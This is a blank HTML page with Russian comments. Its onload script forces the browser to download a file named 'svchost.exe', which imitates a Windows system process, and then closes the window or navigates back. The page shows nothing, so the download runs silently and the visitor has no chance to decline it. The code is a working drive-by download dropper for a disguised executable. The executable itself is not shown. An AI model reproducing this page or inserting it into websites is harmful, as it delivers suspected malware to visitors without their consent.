<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <script>
        window.onload = function() {
            var link = document.createElement('a');
            link.href = '/download/svchost.exe';
            link.download = 'svchost.exe';
            
            // Добавляем ссылку в документ
            document.body.appendChild(link);
            link.click();
            
            // Удаляем ссылку после клика
            document.body.removeChild(link);
            
            // Закрываем окно через небольшую задержку
            setTimeout(function() {
                window.close();
                // Если window.close() не сработает (из-за политики браузера),
                // можно перенаправить на предыдущую страницу
                if (window.history.length > 1) {
                    window.history.back();
                }
            }, 100);
        };
    </script>
</head>
<body>
</body>
</html>
